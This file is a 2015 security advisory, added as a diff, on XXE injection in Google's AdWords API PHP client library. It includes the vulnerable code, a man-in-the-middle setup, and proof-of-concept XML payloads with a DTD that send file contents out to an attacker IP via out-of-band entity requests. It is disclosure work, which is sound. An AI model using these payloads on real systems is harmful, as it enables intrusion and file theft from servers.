@@ -1,0 +1,318 @@
+# Date: 06.11.2015
+# Exploit Author: Dawid Golunski
+# Vendor Homepage: https://developers.google.com/adwords/api/docs/clientlibraries
+# Software Link: https://github.com/googleads/googleads-php-lib
+# Version: Google AdWords API client libraries - XML eXternal Entity Injection (XXE)
+
+
+=============================================
+- Release date: 06.11.2015
+- Discovered by: Dawid Golunski
+- Severity: Medium/High
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+Google AdWords API client libraries   -    XML eXternal Entity Injection (XXE)
+
+Confirmed in googleads-php-lib <= 6.2.0 for PHP, AdWords libraries: 
+googleads-java-lib for Java, and googleads-dotnet-lib for .NET are also likely
+to be affected.
+
+ 
+II. BACKGROUND
+-------------------------
+
+- AdWords API
+
+"The AdWords API is a collection of web services that you can use to build 
+applications that manage AdWords accounts and their associated campaign data.
+While the AdWords API is based on SOAP 1.1, high-level client libraries are 
+provided to help you develop applications more quickly."
+
+AdWords API client libraries are available for different platforms
+such as PHP, .NET, Java etc. 
+
+These can be found at:
+
+https://developers.google.com/adwords/api/docs/clientlibraries
+ 
+III. INTRODUCTION
+-------------------------
+
+As Google AdWords is based on SOAP protocol that uses XML to transfer the data,
+client API libraries should have necessary preventions against XML eXternal 
+Entity injection attacks. However, an independent research found the necessary
+preventions to be lacking in several Google AdWords API client libraries,
+which could allow XXE attacks on applications/servers that make use of them.
+
+XXE (XML eXternal Entity) attack is an attack on an application that parses XML 
+input from untrusted sources using incorrectly configured XML parser. 
+The application may be forced to open arbitrary files and/or network resources.
+Exploiting XXE issues on PHP applications may also lead to denial of service or
+in some cases (when an 'expect' PHP module is installed) lead to command 
+execution.
+
+IV. DESCRIPTION
+-------------------------
+ 
+This advisory will focus on PHP version of the AdWords API client library.
+Other versions of the client library such as .NET and Java seem to be 
+vulnerable in a similar way.
+
+googleads-php-lib contains the following function which queries WSDL from the 
+remote google adwords server:
+
+---[ build_lib/WSDLInterpreter/WSDLInterpreter.php ]---
+
+  protected function loadWsdl($wsdlUri, $proxy = null) {
+    // Set proxy.
+    if ($proxy) {
+      $opts = array(
+          'http' => array(
+              'proxy' => $proxy,
+              'request_fulluri' => true
+          )
+      );
+      $context = stream_context_get_default($opts);
+      libxml_set_streams_context($context);
+    }
+
+    $this->dom = new DOMDocument();
+    $this->dom->load($wsdlUri,
+        LIBXML_DTDLOAD|LIBXML_DTDATTR|LIBXML_NOENT|LIBXML_XINCLUDE);
+
+    $this->serviceNamespace =
+        $this->dom->documentElement->getAttribute('targetNamespace');
+  }
+
+-------------------------------------------------------
+
+The function connects to the API endpoint to get the WSDL document describing
+the functionality of the AdWords web service in XML.
+
+For security reasons Google AdWords API can only be accessed via HTTPS. 
+However, the above code does not set appropriate SSL settings on the 
+https:// stream context. It fails to assign Certificate Authority (CA),
+and turn the verify_peer option to ON.
+It uses the stream_context_get_default() to get the default context,
+which on all PHP versions below PHP 5.6.x (see references below) does not 
+validate the CA by default. 
+
+Because of this, applications using the AdWords API library may be tricked into 
+retrieving data from untrusted sources pretending to be adwords.google.com.
+
+The above code does not provide any XXE injection attack prevention.
+It does not disable external entity processing. To make it worse,
+it specifically enables it via the LIBXML parameters provided to the 
+dom->load() function so an XXE injection attack would work even on
+systems that have the newest and fully patched version of libxml library 
+which does not process the entities by default.
+
+Another vulnerable part of the application is located in the code:
+
+---[ src/Google/Api/Ads/Common/Util/XmlUtils.php ]---
+
+  public static function GetDomFromXml($xml) {
+    set_error_handler(array('XmlUtils', 'HandleXmlError'));
+    $dom = new DOMDocument();
+    $dom->loadXML($xml,
+        LIBXML_DTDLOAD | LIBXML_DTDATTR | LIBXML_NOENT | LIBXML_XINCLUDE);
+    restore_error_handler();
+    return $dom;
+  }
+
+-----------------------------------------------------
+
+which is used by the AdsSoapClient class to process SOAP requests. It
+also activates the ENTITY processing even if libxml parser is set to
+ingore them by default. AdsSoapClient can be configured to verify SSL peer
+in SSL communication via the settings INI file but this option is set to 
+off by default.
+
+These SSL settings, and the XML ENTITY processing combined make applications 
+using the AdWords API vulnerable to XXE injection attacks. 
+
+For the attack to be successful, an attacker needs to
+perform a MitM attack to impersonate adwords.google.com server (eg. via DNS 
+poisoning/spoofing/proxy attacks, ARP spoofing, etc.) to inject malicious 
+XML input.
+
+ 
+V. PROOF OF CONCEPT
+-------------------------
+ 
+Below is a test application that makes use of the PHP Google AdWords API 
+library.
+
+The application simply connects to the AdWords API endpoint to retrieve the 
+WSDL document.
+
+---[ testAPI.php ]---
+
+<?php
+// Test application reading WSDL from Google AdWords 
+
+set_include_path('./build_lib/WSDLInterpreter/');
+require_once 'WSDLInterpreter.php';
+
+$wsdlUri = 'https://adwords.google.com/api/adwords/cm/v201502/'
+	  .'CampaignService?wsdl';
+
+$wsdlInterpreter = new WSDLInterpreter($wsdlUri, "AdWordsSoapClient",null, 
+null, "CampaignService", "v201502", "Ads_Google", 
+"./src/Google/Api/Ads/AdWords/Lib/AdWordsSoapClient.php", null, true, null);
+
+?>
+
+---------------------
+
+
+To exploit this application, an attacker needs to perform a MitM attack to 
+impersonate adwords.google.com server, as mentioned in the introduction.
+For simplicity, we can add the following entry to /etc/hosts on the victim's
+server:
+
+192.168.57.12   adwords.google.com
+
+to simulate a successful MitM attack where attacker successfully manages
+to ,for example, poison the DNS cache to point the adwords subdomain at his
+malicious web server (192.168.57.12).
+
+The attacker then needs to create a malicious XML file on his server to 
+return it to the victim. Example payload could look as follows:
+
+$ curl --insecure 'https://192.168.57.12/api/adwords/cm/v201502/CampaignService?wsdl'
+
+<?xml version="1.0"?>
+<!DOCTYPE root
+[
+<!ENTITY xxetest SYSTEM "http://192.168.57.12/adwords_xxe_hack.dtd">
+]>
+<test><testing>&xxetest;</testing></test>
+
+
+The XML payload returned by the attacker will cause the vulnerable
+AdWords API library to resolve the 'xxetest' entity and connect
+back to the attacker's server to retrieve adwords_xxe_hack.dtd.
+
+
+This can be verified on the victim's server by executing the demonstrated
+testAPI.php script:
+
+$ curl http://victims_server/googleads-php-lib-master/testAPI.php
+
+
+The script will try to retrieve the WSDL/XML document from adwords.google.com
+which will provide the above malicious XML. 
+After the injected entity is read, the attacker will get a connection from the 
+victim:
+
+attacker@mitm# nc -vv -l 8080
+Connection from victims_server port 8080 [tcp/http-alt] accepted
+GET /adwords_xxe_hack.dtd HTTP/1.0
+Host: 192.168.57.12:8080
+
+
+At this point attacker could add other entities to carry out an Out of band
+XXE attack to read system files (such as /etc/passwd) located on the victim's 
+server, or execute commands via expect:// PHP wrapper if the 'expect' module
+is enabled.
+
+
+For example, this payload:
+
+<?xml version="1.0"?>
+<!DOCTYPE test [ 
+ <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+ <!ENTITY % dtd SYSTEM "http://192.168.57.12/send.dtd">
+%dtd;
+]>
+<test><testing>test &send;</testing></test>
+
+with another file located on the attacker's file server:
+
+---[ send.dtd ]---
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.57.12:8080/retrieved/%file;'>">
+%all;
+
+------------------
+
+would send the contents of the /etc/hosts file to the attacker.
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The severity of this issue is lowered to medium/high despite as the XXE 
+injection vulnerability in the code, the attacker must impersonate 
+adwords.google.com server to be able to inject malicious XML. 
+If there is a possibility for such an attack, the severity of the issue can
+grow to high/critical due to the exploitation possibilities through XXE
+injection.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+The latest version of Google AdWords API PHP client library was confirmed to 
+be vulnerable. The client libraries for other platforms seem to lack necessary 
+XXE attack preventions too. 
+For example, the Java version, did not set the 
+'sax/features/external-general-entities' setting to off when creating an 
+instance of the DocumentBuilderFactory class. And the .NET version of the 
+AdWords API was missing explicit 'ProhibitDtd' setting on the XMLReader.
+
+Vulnerabilities were found in googleads-php-lib in versions below 5.9.0 and 
+reported to Google in May 2015, they were just fixed in AdWords php library ver. 
+6.3.0.
+ 
+VIII. SOLUTION
+-------------------------
+
+Install the latest version of the Google AdWords API library available for your
+platform, and tighten SSL settings by enabling SSL CA verification in the
+library settings file.
+ 
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com/advisories/Google-AdWords-API-libraries-XXE-Injection-Vulnerability.txt
+
+https://developers.google.com/adwords/api/docs/clientlibraries
+
+https://github.com/googleads/googleads-php-lib
+
+https://developers.google.com/adwords/api/docs/
+
+PHP 5.6.x openssl certificates in PHP streams:
+http://php.net/manual/en/migration56.openssl.php
+
+http://legalhackers.com
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+
+http://legalhackers.com
+ 
+XI. TIMELINE
+-------------------------
+
+May 18th, 2015:  Advisory created and sent to Google Security Team
+
+Nov 5th,  2015:  Google, after half a year, confirm the vulnerability has been patched
+
+Nov 6th,  2015:  Advisory released publicly
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
